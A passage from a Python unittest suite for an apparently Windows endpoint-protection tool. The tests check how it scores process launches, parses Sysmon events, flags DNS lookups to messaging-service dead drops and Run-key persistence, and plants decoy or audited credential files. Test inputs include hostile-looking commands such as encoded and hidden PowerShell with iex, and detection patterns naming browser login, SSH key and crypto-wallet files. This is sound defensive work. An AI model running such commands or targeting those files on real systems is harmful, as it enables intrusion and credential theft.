        self.assertEqual(self.level(system + r"\certutil.exe", "certutil -store my").level, LOW)
        self.assertEqual(self.level(system + r"\rundll32.exe", "rundll32 shell32.dll,Control_RunDLL").level, LOW)

    def test_script_from_downloads_is_high(self):
        cmd = r"wscript C:\Users\u\Downloads\invoice.js"
        self.assertEqual(self.level(r"C:\Windows\System32\wscript.exe", cmd).level, HIGH)
        self.assertEqual(self.level(r"C:\Windows\System32\wscript.exe", r"wscript C:\tools\a.vbs").level, LOW)

    def test_document_spawning_shell_is_high(self):
        self.assertEqual(self.level(PS, "powershell", "WINWORD.EXE").level, HIGH)

    def test_unsigned_download_asks_and_internet_raises(self):
        path = r"C:\Users\u\Downloads\free_tool.exe"
        self.assertEqual(self.level(path, "", "explorer.exe", "unsigned").level, MEDIUM)
        self.assertEqual(self.level(path, "", "explorer.exe", "unsigned", 3).score, 65)

    def test_masquerade_is_high(self):
        self.assertEqual(self.level(r"C:\Users\u\svchost.exe", "svchost", "explorer.exe").level, HIGH)
        self.assertEqual(self.level(r"C:\Windows\System32\svchost.exe", "svchost -k x", "services.exe").level, LOW)

    def test_browser_debug_port_asks(self):
        path = r"C:\Program Files\Google\Chrome\Application\chrome.exe"
        self.assertEqual(self.level(path, "chrome --remote-debugging-port=9222").level, MEDIUM)
        self.assertEqual(self.level(path, "chrome --type=renderer").level, LOW)


class FakeLaunches:
    def __init__(self):
        self.pids = [1, 2]

    def snapshot(self):
        return list(self.pids)


class EngineLaunchTests(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self.tmp.cleanup)
        self.store = Store(self.tmp.name)
        self.source = FakeSource()
        self.inspector = FakeInspector()
        self.actions = FakeActions()
        self.alerts = []
        self.launches = FakeLaunches()
        self.engine = Engine(
            self.source, self.inspector, self.actions, self.store, on_alert=self.alerts.append,
            clock=lambda: 1000.0, self_pids={99}, launches=self.launches, zone_of=lambda _p: 3,
        )
        self.inspector.add(ProcFacts(1, 1, "evil.exe", BAD, None, None, "unsigned"))
        self.inspector.add(ProcFacts(2, 1, "evil.exe", BAD, None, None, "unsigned"))
        self.engine.poll_once()  # 起動時から動いているものは見ない

    def launch(self, facts):
        self.inspector.add(facts)
        self.launches.pids.append(facts.pid)
        self.engine.poll_once()

    def test_existing_processes_are_baseline(self):
        self.assertEqual(self.alerts, [])

    def test_suspicious_launch_is_suspended_without_connection(self):
        self.launch(ProcFacts(50, 1, "powershell.exe", PS_REAL, "explorer.exe", "powershell -enc AAAA", "valid"))
        self.assertEqual(self.alerts[0].action, "suspended")
        self.assertEqual(self.alerts[0].direction, "launch")
        self.assertIsNone(self.alerts[0].conn)
        self.assertIn(("suspend", 50), self.actions.calls)
        ok, _ = self.engine.decide(self.alerts[0].id, RESUME)
        self.assertTrue(ok)
        self.assertIn(("resume", 50), self.actions.calls)

    def test_medium_launch_only_asks(self):
        self.launch(ProcFacts(51, 1, "tool.exe", BAD, "explorer.exe", "tool", "unsigned"))
        self.assertEqual(self.alerts[0].action, "ask")
        self.assertEqual(self.actions.calls, [])

    def test_ordinary_launch_is_silent(self):
        self.launch(ProcFacts(52, 1, "notepad.exe", r"C:\Windows\System32\notepad.exe", "explorer.exe", "notepad", "valid"))
        self.assertEqual(self.alerts, [])

    def test_observe_never_suspends_launch(self):
        self.engine.observe = True
        self.launch(ProcFacts(53, 1, "powershell.exe", PS_REAL, "explorer.exe", "powershell -enc AAAA", "valid"))
        self.assertEqual(self.alerts[0].action, "observe")
        self.assertEqual(self.actions.calls, [])

    def test_trusted_file_is_silent(self):
        self.store.add_trust(BAD, "hash-1")
        self.launch(ProcFacts(54, 1, "tool.exe", BAD, "explorer.exe", "tool", "unsigned"))
        self.assertEqual(self.alerts, [])

    def test_exited_process_is_ignored(self):
        self.launches.pids.append(55)
        self.engine.poll_once()
        self.assertEqual(self.alerts, [])

    def test_log_works_without_connection(self):
        self.launch(ProcFacts(56, 1, "powershell.exe", PS_REAL, "explorer.exe", "powershell -enc AAAA", "valid"))
        event = self.store.recent_events()[0]
        self.assertEqual(event["direction"], "launch")
        self.assertEqual(event["remote"], "")


class EngineControlTests(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self.tmp.cleanup)
        self.store = Store(self.tmp.name)
        self.inspector = FakeInspector()
        self.actions = FakeActions()
        self.engine = Engine(FakeSource(), self.inspector, self.actions, self.store, clock=lambda: 1000.0, self_pids={99})
        self.inspector.add(proc(BAD, pid=100))
        self.inspector.add(ProcFacts(300, 1, "svchost.exe", r"C:\Windows\System32\svchost.exe", None, None, "valid"))

    def test_suspend_and_resume(self):
        ok, _ = self.engine.control(100, SUSPEND)
        self.assertTrue(ok)
        self.assertTrue(self.engine.is_suspended(100))
        self.assertEqual(len(self.store.load_suspended()), 1)
        ok, _ = self.engine.control(100, RESUME)
        self.assertTrue(ok)
        self.assertFalse(self.engine.is_suspended(100))
        self.assertEqual(self.store.load_suspended(), [])

    def test_double_suspend_does_not_nest(self):
        self.engine.control(100, SUSPEND)
        self.engine.control(100, SUSPEND)
        self.assertEqual(self.actions.calls.count(("suspend", 100)), 1)

    def test_resume_of_unstopped_does_nothing(self):
        self.engine.control(100, RESUME)
        self.assertEqual(self.actions.calls, [])

    def test_protected_cannot_be_stopped(self):
        for operation in (SUSPEND, TERMINATE):
            ok, _ = self.engine.control(300, operation)
            self.assertFalse(ok)
        ok, _ = self.engine.control(99, SUSPEND) if 99 in self.inspector.procs else (False, "")
        self.assertFalse(ok)
        self.assertEqual(self.actions.calls, [])

    def test_exited_process(self):
        ok, _ = self.engine.control(12345, SUSPEND)
        self.assertFalse(ok)
        self.assertEqual(self.actions.calls, [])

    def test_observe_blocks_suspend(self):
        self.engine.observe = True
        ok, _ = self.engine.control(100, SUSPEND)
        self.assertFalse(ok)

    def test_terminate(self):
        self.engine.control(100, SUSPEND)
        ok, _ = self.engine.control(100, TERMINATE)
        self.assertTrue(ok)
        self.assertIn(("terminate", 100), self.actions.calls)
        self.assertEqual(self.store.load_suspended(), [])

    def test_shutdown_resumes_manually_stopped(self):
        self.engine.control(100, SUSPEND)
        self.engine.shutdown()
        self.assertIn(("resume", 100), self.actions.calls)


def sysmon_xml(event_id, record=1, **data):
    fields = "".join(f"<Data Name='{k}'>{escape(str(v))}</Data>" for k, v in data.items())
    return (
        "<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System>"
        f"<EventID>{event_id}</EventID><TimeCreated SystemTime='2026-11-06T00:29:59.4134080Z'/>"
        f"<EventRecordID>{record}</EventRecordID></System><EventData>{fields}</EventData></Event>"
    )


class SysmonParseTests(unittest.TestCase):
    def test_parse(self):
        event = parse_event(sysmon_xml(1, 7, ProcessId=42, Image=r"C:\a.exe", CommandLine="a <b> & c"))
        self.assertEqual((event.event_id, event.record_id, event.pid, event.image), (1, 7, 42, r"C:\a.exe"))
        self.assertEqual(event.data["CommandLine"], "a <b> & c")
        self.assertEqual(event.time.year, 2026)

    def test_broken_input_is_none(self):
        for xml in ("", "<a", "not xml", "<Event/>", "<Event xmlns='x'><System/></Event>", "<" * 300_000):
            self.assertIsNone(parse_event(xml), xml[:20])

    def test_bad_pid_is_zero(self):
        self.assertEqual(parse_event(sysmon_xml(1, ProcessId="abc")).pid, 0)

    def test_dead_drop_names(self):
        self.assertEqual(dead_drop_service("api.telegram.org"), "Telegram")
        self.assertEqual(dead_drop_service("CDN.DISCORDAPP.COM."), "Discord")
        self.assertEqual(dead_drop_service("evil.workers.dev"), "Cloudflare Workers")
        for host in ("example.com", "nottelegram.org", "api.telegram.org.evil.test", "discord.com.evil.test"):
            self.assertIsNone(dead_drop_service(host), host)

    def test_dns_rules(self):
        def level(path, signature):
            facts = ProcFacts(1, 1, path.rsplit("\\", 1)[-1], path, None, None, signature)
            return assess_dns(facts, "api.telegram.org", ROOT).level
        self.assertEqual(level(r"C:\Users\u\Downloads\a.exe", "unsigned"), HIGH)
        self.assertEqual(level(r"C:\tools\a.exe", "unsigned"), MEDIUM)
        self.assertEqual(level(r"C:\Program Files\Google\Chrome\chrome.exe", "unsigned"), LOW)
        self.assertEqual(level(r"C:\Users\u\AppData\Local\Telegram\Telegram.exe", "valid"), LOW)
        self.assertEqual(level(r"C:\Windows\System32\svchost.exe", "unsigned"), LOW)
        self.assertEqual(level(r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", "unsigned"), MEDIUM)

    def test_ordinary_host_is_low(self):
        facts = ProcFacts(1, 1, "a.exe", r"C:\Users\u\Downloads\a.exe", None, None, "unsigned")
        self.assertEqual(assess_dns(facts, "example.com", ROOT).level, LOW)

    def test_registered_path(self):
        self.assertEqual(registered_path(r'"C:\Program Files\A\a.exe" --tray'), r"C:\Program Files\A\a.exe")
        self.assertEqual(registered_path(r"C:\tools\a.exe /x"), r"C:\tools\a.exe")
        self.assertEqual(registered_path(r"C:\Program Files\A\my app.exe /x"), r"C:\Program Files\A\my app.exe")
        self.assertIsNone(registered_path("  "))

    def test_persistence_rules(self):
        run = r"HKU\S-1\Software\Microsoft\Windows\CurrentVersion\Run\Updater"
        writer = ProcFacts(1, 1, "a.exe", r"C:\a.exe")
        def level(details, signature="unknown", target=run):
            return assess_persistence(writer, target, details, signature, ROOT).level
        self.assertEqual(level(r"C:\Users\u\Downloads\a.exe", "unsigned"), HIGH)
        self.assertEqual(level(r"C:\Users\u\AppData\Roaming\a.exe", "unsigned"), MEDIUM)
        self.assertEqual(level(r'"C:\Users\u\AppData\Local\Discord\Update.exe" --start', "valid"), LOW)
        self.assertEqual(level(r"C:\Program Files\A\a.exe", "unsigned"), LOW)
        self.assertEqual(level("powershell -w hidden -c iex", "valid"), HIGH)
        self.assertEqual(level(r"C:\a.exe", "unsigned", r"HKLM\Software\Other\Value"), LOW)
        self.assertTrue(is_run_key(r"HKU\X\Software\Microsoft\Windows\CurrentVersion\RunOnce\A"))
        self.assertFalse(is_run_key(r"HKU\X\Software\Microsoft\Windows\CurrentVersion\Runner\A"))


class FakeSysmon:
    def __init__(self):
        self.items = []
        self.status = "ok"
        self.cleared = False

    def poll(self):
        items, self.items = self.items, []
        return items


class EngineSysmonTests(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self.tmp.cleanup)
        self.store = Store(self.tmp.name)
        self.inspector = FakeInspector()
        self.actions = FakeActions()
        self.alerts = []
        self.sysmon = FakeSysmon()
        self.engine = Engine(
            FakeSource(), self.inspector, self.actions, self.store, on_alert=self.alerts.append,
            clock=lambda: 1000.0, self_pids={99}, sysmon=self.sysmon, launch_assess=lambda f, z: assess_launch(f, z),
        )

    def feed(self, *items):
        self.sysmon.items = list(items)
        self.engine.poll_once()

    def test_short_lived_launch_is_still_reported(self):
        self.feed(sysmon_xml(1, ProcessId=500, Image=PS_REAL, ParentImage=r"C:\Windows\explorer.exe", CommandLine="powershell -enc AAAA"))
        self.assertEqual(self.alerts[0].action, "exited")
        self.assertEqual(self.alerts[0].proc.cmdline, "powershell -enc AAAA")
        self.assertEqual(self.actions.calls, [])
        ok, _ = self.engine.decide(self.alerts[0].id, RESUME)
        self.assertTrue(ok)
        self.assertEqual(self.engine.pending(), [])

    def test_live_launch_is_suspended(self):
        self.inspector.add(ProcFacts(501, 1, "powershell.exe", PS_REAL, "explorer.exe", "powershell -enc AAAA", "valid"))
        self.feed(sysmon_xml(1, ProcessId=501, Image=PS_REAL, CommandLine="powershell -enc AAAA"))
        self.assertEqual(self.alerts[0].action, "suspended")
        self.assertIn(("suspend", 501), self.actions.calls)

    def test_reused_pid_is_not_suspended(self):
        self.inspector.add(ProcFacts(502, 1, "notepad.exe", r"C:\Windows\System32\notepad.exe", None, None, "valid"))
        self.feed(sysmon_xml(1, ProcessId=502, Image=PS_REAL, ParentImage=r"C:\Windows\explorer.exe", CommandLine="powershell -enc AAAA"))
        self.assertEqual(self.alerts[0].action, "exited")
        self.assertEqual(self.actions.calls, [])

    def test_self_events_are_ignored(self):
        self.feed(sysmon_xml(1, ProcessId=99, Image=PS_REAL, CommandLine="powershell -enc AAAA"))
        self.assertEqual(self.alerts, [])

    def test_dns_dead_drop(self):
        self.inspector.add(proc(BAD, pid=503))
        self.feed(sysmon_xml(22, ProcessId=503, Image=BAD, QueryName="api.telegram.org"))
        self.assertEqual(self.alerts[0].action, "suspended")
        self.assertEqual(self.alerts[0].direction, "dns")
        self.assertEqual(self.engine.dns_hosts(503), ["api.telegram.org"])

    def test_ordinary_dns_is_only_remembered(self):
        self.inspector.add(proc(BAD, pid=504))
        self.feed(sysmon_xml(22, ProcessId=504, Image=BAD, QueryName="example.com"), sysmon_xml(22, ProcessId=504, Image=BAD, QueryName="example.com"))
        self.assertEqual(self.alerts, [])
        self.assertEqual(self.engine.dns_hosts(504), ["example.com"])

    def test_host_list_is_bounded(self):
        self.feed(*[sysmon_xml(22, ProcessId=505, Image=BAD, QueryName=f"h{i}.example") for i in range(100)])
        self.assertEqual(len(self.engine.dns_hosts(505)), 32)

    def test_persistence_is_logged_and_alerted(self):
        run = r"HKU\S\Software\Microsoft\Windows\CurrentVersion\Run\Evil"
        self.feed(sysmon_xml(13, ProcessId=506, Image=r"C:\Windows\System32\reg.exe", TargetObject=run, Details="powershell -enc AAAA"))
        self.assertEqual(self.alerts[0].action, "exited")
        self.assertEqual(self.alerts[0].direction, "persistence")
        events = [e for e in self.store.recent_events() if e["event"] == "persistence"]
        self.assertEqual(events[0]["target"], run)

    def test_other_registry_is_ignored(self):
        self.feed(sysmon_xml(13, ProcessId=507, Image=BAD, TargetObject=r"HKLM\Software\Other", Details="powershell"))
        self.assertEqual(self.alerts, [])
        self.assertEqual(self.store.recent_events(), [])

    def test_observe_never_suspends(self):
        self.engine.observe = True
        self.inspector.add(proc(BAD, pid=508))
        self.feed(sysmon_xml(22, ProcessId=508, Image=BAD, QueryName="api.telegram.org"))
        self.assertEqual(self.alerts[0].action, "observe")
        self.assertEqual(self.actions.calls, [])

    def test_log_clearing_is_alerted(self):
        self.sysmon.cleared = True
        self.engine.poll_once()
        self.assertEqual(self.alerts[0].direction, "tamper")
        self.assertEqual(self.alerts[0].action, "exited")
        self.assertFalse(self.sysmon.cleared)

    def test_broken_event_does_not_stop_others(self):
        self.inspector.add(proc(BAD, pid=509))
        self.feed("<broken", sysmon_xml(22, ProcessId=509, Image=BAD, QueryName="api.telegram.org"))
        self.assertEqual(len(self.alerts), 1)


class SysmonSourceTests(unittest.TestCase):
    def make(self, latest, batches):
        source = eventlog.SysmonSource("Test")
        self.latest = latest
        self.batches = list(batches)
        patches = [
            mock.patch.object(eventlog, "latest_record_id", lambda _c: self.latest),
            mock.patch.object(eventlog, "read_events", lambda _c, _after: self.batches.pop(0) if self.batches else (eventlog.OK, [])),
        ]
        for patch in patches:
            patch.start()
            self.addCleanup(patch.stop)
        return source

    def test_old_events_are_skipped(self):
        source = self.make((eventlog.OK, 100), [(eventlog.OK, [sysmon_xml(1, 101)])])
        self.assertEqual(source.poll(), [])
        self.assertEqual(len(source.poll()), 1)
        self.assertEqual(source._last_record, 101)

    def test_channel_not_ready_is_its_own_status(self):
        self.assertEqual(eventlog._status_of(eventlog.ERROR_WMI_INSTANCE_NOT_FOUND), eventlog.NOT_READY)
        self.assertEqual(eventlog._status_of(1), eventlog.FAILED)

    def test_not_installed_retries_later(self):
        source = self.make((eventlog.NOT_INSTALLED, 0), [])
        self.assertEqual(source.poll(), [])
        self.assertEqual(source.status, eventlog.NOT_INSTALLED)
        self.latest = (eventlog.OK, 5)
        for _ in range(70):
            source.poll()
        self.assertEqual(source.status, eventlog.OK)

    def test_clearing_is_found(self):
        source = self.make((eventlog.OK, 100), [])
        source.poll()
        self.latest = (eventlog.OK, 3)
        for _ in range(eventlog.CLEAR_CHECK_POLLS):
            source.poll()
        self.assertTrue(source.cleared)
        self.assertEqual(source._last_record, 3)


class SysmonConfigTests(unittest.TestCase):
    def test_config_is_well_formed_and_narrow(self):
        path = Path(__file__).resolve().parent / "tools" / "mamorun-sysmon.xml"
        root = ET.parse(path).getroot()
        self.assertEqual(root.tag, "Sysmon")
        self.assertIn("schemaversion", root.attrib)
        filtering = root.find("EventFiltering")
        logged_all = {child.tag for child in filtering if child.get("onmatch") == "exclude"}
        self.assertEqual(logged_all, {"ProcessCreate", "DnsQuery"})
        with_rules = {child.tag for child in filtering if len(child)}
        self.assertEqual(with_rules, {"RegistryEvent"})
        self.assertIn("NetworkConnect", {child.tag for child in filtering if child.get("onmatch") == "include"})

    def test_install_script_verifies_signature_and_asks_first(self):
        folder = Path(__file__).resolve().parent / "tools"
        text = (folder / "install_sysmon.ps1").read_text(encoding="utf-8")
        # Windows PowerShell 5.1 はBOMなしのUTF-8を誤読するので、英数字だけで書く
        self.assertTrue(text.isascii())
        self.assertTrue((folder / "remove_sysmon.ps1").read_text(encoding="utf-8").isascii())
        self.assertLess(text.index("Confirm-License\n\n# 2."), text.index("Invoke-WebRequest"))
        self.assertLess(text.index("Get-AuthenticodeSignature"), text.rindex("-accepteula"))


class StrictModeTests(unittest.TestCase):
    UNSIGNED_TOOL = r"C:\tools\tool.exe"

    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self.tmp.cleanup)
        self.store = Store(self.tmp.name)
        self.source = FakeSource()
        self.inspector = FakeInspector()
        self.actions = FakeActions()
        self.alerts = []
        self.engine = Engine(
            self.source, self.inspector, self.actions, self.store, on_alert=self.alerts.append,
            clock=lambda: 1000.0, self_pids={99}, strict=True,
        )
        self.inspector.add(proc(self.UNSIGNED_TOOL, pid=400))
        self.engine.poll_once()

    def test_unknown_unsigned_is_asked_without_gate(self):
        self.source.conns = [conn(pid=400, port=443)]
        self.engine.poll_once()
        self.assertEqual(self.alerts[0].action, "ask")
        self.assertIn("strict_unknown", [r.code for r in self.alerts[0].assessment.reasons])
        self.assertFalse(self.store.is_seen(self.UNSIGNED_TOOL))

    def test_signed_passes(self):
        self.inspector.add(ProcFacts(401, 1, "app.exe", r"C:\tools\app.exe", None, None, "valid"))
        self.source.conns = [conn(pid=401, port=443)]
        self.engine.poll_once()
        self.assertEqual(self.alerts, [])
        self.assertTrue(self.store.is_seen(r"C:\tools\app.exe"))

    def test_system_catalog_signed_passes(self):
        self.inspector.add(ProcFacts(402, 1, "app.exe", os.path.join(os.environ["SystemRoot"], "app.exe"), None, None, "unsigned"))
        self.source.conns = [conn(pid=402, port=443)]
        self.engine.poll_once()
        self.assertEqual(self.alerts, [])

    def test_off_keeps_old_behavior(self):
        self.engine.strict = False
        self.source.conns = [conn(pid=400, port=443)]
        self.engine.poll_once()
        self.assertEqual(self.alerts, [])

    def test_known_paths_exclude_unsigned_unless_trusted(self):
        self.inspector.signature_of = lambda path: "valid" if "signed" in path else "unsigned"
        self.store.mark_seen(self.UNSIGNED_TOOL)
        self.store.mark_seen(r"C:\tools\signed.exe")
        self.assertEqual(self.engine.known_app_paths(), [r"C:\tools\signed.exe".lower()])
        self.store.add_trust(self.UNSIGNED_TOOL, "hash-1")
        self.assertEqual(len(self.engine.known_app_paths()), 2)
        self.engine.strict = False
        self.store.mark_seen(r"C:\tools\other.exe")
        self.assertEqual(len(self.engine.known_app_paths()), 3)


class FakeAudit:
    POLICY_SUCCESS = 1

    def __init__(self, policy=0, can_write=True, can_audit=True):
        self.policy = policy
        self.can_write = can_write
        self.can_audit = can_audit
        self.audited = []
        self.sacls = {}

    def read_policy(self):
        return self.policy

    def write_policy(self, value):
        if self.can_write:
            self.policy = value
        return self.can_write

    def audit_file_reads(self, path):
        self.audited.append(path)
        if self.can_audit:
            self.sacls[path] = "S:(AU;SA;CC;;;WD)"
        return self.can_audit

    def clear_audit(self, path):
        self.sacls[path] = "S:"
        return True

    def sacl_text(self, path):
        return self.sacls.get(path, "S:")


TRAP_TEST_SPECS = (("ROOT", r"Exodus\exodus.wallet\passphrase.json", "wallet"), ("ROOT", r"docs\passwords_old.txt", "password"))


class TrapManagerTests(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self.tmp.cleanup)
        self.root = Path(self.tmp.name) / "profile"
        self.root.mkdir()
        self.store = Store(Path(self.tmp.name) / "data")
        self.audit = FakeAudit()
        self.manager = TrapManager(self.store, self.audit, environ={"ROOT": str(self.root)}, specs=TRAP_TEST_SPECS)

    def test_install_and_remove_restore_everything(self):
        ok, _ = self.manager.install()
        self.assertTrue(ok)
        bait = self.root / "Exodus" / "exodus.wallet" / "passphrase.json"
        self.assertTrue(bait.exists())
        self.assertIn("decoy", bait.read_text(encoding="ascii"))
        self.assertEqual(len(self.audit.audited), 2)
        self.assertEqual(self.audit.policy, 1)
        ok, _ = self.manager.remove()
        self.assertTrue(ok)
        self.assertEqual(list(self.root.iterdir()), [])
        self.assertEqual(self.audit.policy, 0)
        self.assertFalse(self.manager.installed)

    def test_existing_files_are_never_touched(self):
        real = self.root / "docs" / "passwords_old.txt"
        real.parent.mkdir()
        real.write_text("real data", encoding="utf-8")
        self.manager.install()
        self.assertEqual(real.read_text(encoding="utf-8"), "real data")
        self.assertNotIn(str(real), self.audit.audited)
        self.manager.remove()
        self.assertEqual(real.read_text(encoding="utf-8"), "real data")

    def test_user_files_in_new_folder_survive_remove(self):
        self.manager.install()
        extra = self.root / "Exodus" / "exodus.wallet" / "real.txt"
        extra.write_text("x", encoding="utf-8")
        self.manager.remove()
        self.assertTrue(extra.exists())

    def test_previous_policy_is_restored_when_already_on(self):
        self.audit.policy = 3
        self.manager.install()
        self.assertEqual(self.audit.policy, 3)
        self.manager.remove()
        self.assertEqual(self.audit.policy, 3)

    def test_no_permission_changes_nothing(self):
        self.audit.policy = None
        ok, _ = self.manager.install()
        self.assertFalse(ok)
        self.assertEqual(list(self.root.iterdir()), [])
        self.audit.policy = 0
        self.audit.can_write = False
        ok, _ = self.manager.install()
        self.assertFalse(ok)
        self.assertEqual(list(self.root.iterdir()), [])

    def test_sacl_failure_leaves_no_files(self):
        self.audit.can_audit = False
        ok, _ = self.manager.install()
        self.assertFalse(ok)
        self.assertEqual(list(self.root.iterdir()), [])
        self.assertEqual(self.audit.policy, 0)

    def test_install_survives_restart(self):
        self.manager.install()
        again = TrapManager(Store(Path(self.tmp.name) / "data"), self.audit, environ={"ROOT": str(self.root)}, specs=TRAP_TEST_SPECS)
        self.assertEqual(len(again.entries), 2)
        again.remove()
        self.assertEqual(list(self.root.iterdir()), [])

    def test_poll_does_nothing_when_not_installed(self):
        with mock.patch("guardian.traps.latest_record_id", side_effect=AssertionError):
            self.assertEqual(self.manager.poll(), [])


def trap_event(path, pid=0x1F4, image=r"C:\Users\u\Downloads\bad.exe", mask="0x1", event_id=4663, record=9):
    return parse_event(sysmon_xml(event_id, record, ObjectName=path, ProcessId=hex(pid), ProcessName=image, AccessMask=mask))


class WatchTests(unittest.TestCase):
    SPECS = (("ROOT", r"Chrome\User Data\Default\Login Data", ("chrome.exe",)), ("ROOT", r"ssh\id_rsa", ("ssh.exe",)))

    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self.tmp.cleanup)
        self.root = Path(self.tmp.name) / "profile"
        self.login = self.root / "Chrome" / "User Data" / "Default" / "Login Data"
        self.login.parent.mkdir(parents=True)
        self.login.write_bytes(b"real browser data")
        self.store = Store(Path(self.tmp.name) / "data")
        self.audit = FakeAudit()
        self.manager = TrapManager(self.store, self.audit, environ={"ROOT": str(self.root)}, specs=(), watch_specs=self.SPECS)

    def test_watch_marks_existing_only_and_never_changes_content(self):
        ok, _ = self.manager.install_watch()
        self.assertTrue(ok)
        self.assertEqual([e["path"] for e in self.manager.watched], [str(self.login)])
        self.assertEqual(self.manager.watched[0]["kind"], "real")
        self.assertEqual(self.audit.policy, 1)
        self.assertEqual(self.login.read_bytes(), b"real browser data")
        self.assertFalse((self.root / "ssh").exists())

    def test_remove_keeps_real_files_and_restores(self):
        self.manager.install_watch()
        ok, _ = self.manager.remove_watch()
        self.assertTrue(ok)
        self.assertEqual(self.login.read_bytes(), b"real browser data")
        self.assertEqual(self.audit.sacls[str(self.login)], "S:")
        self.assertEqual(self.audit.policy, 0)
        self.assertFalse(self.manager.watching)

    def test_foreign_sacl_is_left_alone(self):
        self.audit.sacls[str(self.login)] = "S:(AU;FA;FA;;;WD)"
        ok, _ = self.manager.install_watch()
        self.assertFalse(ok)
        self.assertEqual(self.audit.sacls[str(self.login)], "S:(AU;FA;FA;;;WD)")
        self.assertEqual(self.audit.audited, [])
        self.assertEqual(self.audit.policy, 0)

    def test_policy_stays_while_other_feature_uses_it(self):
        manager = TrapManager(
            self.store, self.audit, environ={"ROOT": str(self.root)},
            specs=(("ROOT", r"bait\a.txt", "key"),), watch_specs=self.SPECS,
        )
        manager.install()
        manager.install_watch()
        manager.remove_watch()
        self.assertEqual(self.audit.policy, 1)
        manager.remove()
        self.assertEqual(self.audit.policy, 0)

    def test_starts_as_record_only(self):
        self.manager.install_watch()
        self.assertFalse(self.manager.enforce)
        self.manager.set_enforce(True)
        self.assertTrue(self.manager.enforce)

    def test_refresh_restores_replaced_file(self):
        self.manager.install_watch()
        self.audit.sacls[str(self.login)] = "S:"  # ブラウザがファイルを置き換えた
        watched, _ = self.manager._refresh_watch()
        self.assertEqual(len(watched), 1)
        self.assertIn("(", self.audit.sacls[str(self.login)])

    def test_owner_needs_signature_or_proper_place(self):
        hit = TrapHit("x", 1, "chrome.exe", "real", ("chrome.exe",))
        self.assertTrue(is_owner(hit, "chrome.exe", r"C:\Program Files\Google\Chrome\chrome.exe", "unsigned", ROOT))
        self.assertTrue(is_owner(hit, "chrome.exe", r"C:\Users\u\AppData\Local\Chrome\chrome.exe", "valid", ROOT))
        self.assertFalse(is_owner(hit, "chrome.exe", r"C:\Users\u\Downloads\chrome.exe", "unsigned", ROOT))
        self.assertFalse(is_owner(hit, "evil.exe", r"C:\Program Files\A\evil.exe", "valid", ROOT))

    def test_specs_do_not_collide_with_real_app_paths(self):
        standard = {r".aws\credentials", r".ssh\id_rsa", r".ssh\id_ed25519", r".config\gcloud\credentials.db"}
        self.assertFalse({spec[1] for spec in TRAP_SPECS} & standard)
        self.assertFalse(any("Exodus" in spec[1] or "Electrum" in spec[1] or "Bitcoin" in spec[1] for spec in TRAP_SPECS))


class TrapHitTests(unittest.TestCase):
    PATHS = {r"c:\u\bait.json": {"kind": "decoy"}}

    def test_read_is_a_hit(self):
        hit = hit_from_event(trap_event(r"C:\U\bait.json"), self.PATHS)
        self.assertEqual((hit.pid, hit.image), (0x1F4, r"C:\Users\u\Downloads\bad.exe"))

    def test_others_are_not(self):
        self.assertIsNone(hit_from_event(trap_event(r"C:\other.txt"), self.PATHS))
        self.assertIsNone(hit_from_event(trap_event(r"C:\U\bait.json", mask="0x80"), self.PATHS))
        self.assertIsNone(hit_from_event(trap_event(r"C:\U\bait.json", event_id=4656), self.PATHS))
        self.assertIsNone(hit_from_event(trap_event(r"C:\U\bait.json", mask="xyz"), self.PATHS))

    def test_benign_needs_proper_location_or_signature(self):
        self.assertTrue(is_benign_reader("MsMpEng.exe", r"C:\ProgramData\Microsoft\Windows Defender\Platform\MsMpEng.exe", "valid", ROOT))
        self.assertTrue(is_benign_reader("SearchIndexer.exe", r"C:\Windows\System32\SearchIndexer.exe", "unsigned", ROOT))
        self.assertTrue(is_benign_reader("System", None, "unknown", ROOT))
        self.assertFalse(is_benign_reader("explorer.exe", r"C:\Users\u\Downloads\explorer.exe", "unsigned", ROOT))
        self.assertFalse(is_benign_reader("bad.exe", r"C:\Windows\System32\bad.exe", "valid", ROOT))


class FakeTraps:
    def __init__(self):
        self.hits = []

    def poll(self):
        hits, self.hits = self.hits, []
        return hits


class EngineTrapTests(unittest.TestCase):
    TRAP = r"C:\U\passwords_old.txt"

    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self.tmp.cleanup)
        self.store = Store(self.tmp.name)
        self.inspector = FakeInspector()
        self.actions = FakeActions()
        self.alerts = []
        self.traps = FakeTraps()
        self.engine = Engine(
            FakeSource(), self.inspector, self.actions, self.store, on_alert=self.alerts.append,
            clock=lambda: 1000.0, self_pids={99}, traps=self.traps,
        )
        self.inspector.add(proc(BAD, pid=600))

    def hit(self, pid=600, image=BAD):
        self.traps.hits = [TrapHit(self.TRAP, pid, image)]
        self.engine.poll_once()

    def test_live_reader_is_suspended(self):
        self.hit()
        self.assertEqual(self.alerts[0].action, "suspended")
        self.assertEqual(self.alerts[0].direction, "trap")
        self.assertIn(("suspend", 600), self.actions.calls)

    def test_same_hit_alerts_once(self):
        self.hit()
        self.hit()
        self.assertEqual(len(self.alerts), 1)

    def test_signed_program_is_not_suspended_but_loses_permission(self):
        self.inspector.add(ProcFacts(601, 1, "launcher.exe", r"C:\Games\launcher.exe", None, None, "valid"))
        state = self.engine._state_for(601, 1000.0)
        state.allowed = True
        self.hit(601, r"C:\Games\launcher.exe")
        self.assertEqual(self.alerts[0].action, "ask")
        self.assertNotIn(("suspend", 601), self.actions.calls)
        self.assertFalse(state.allowed)

    def test_system_shell_is_still_suspended(self):
        self.inspector.add(ProcFacts(603, 1, "powershell.exe", PS_REAL, None, None, "valid"))
        self.hit(603, PS_REAL)
        self.assertEqual(self.alerts[0].action, "suspended")

    def test_signed_program_has_its_outbound_revoked_with_gate(self):
        gate = FakeGate()
        gate.active = True
        gate.revoke = lambda path: "app-id"
        self.engine.gate = gate
        self.inspector.add(ProcFacts(604, 1, "launcher.exe", r"C:\Games\launcher.exe", None, None, "valid"))
        self.hit(604, r"C:\Games\launcher.exe")
        alert = self.alerts[0]
        self.assertEqual((alert.action, alert.gate_app), ("blocked", "app-id"))
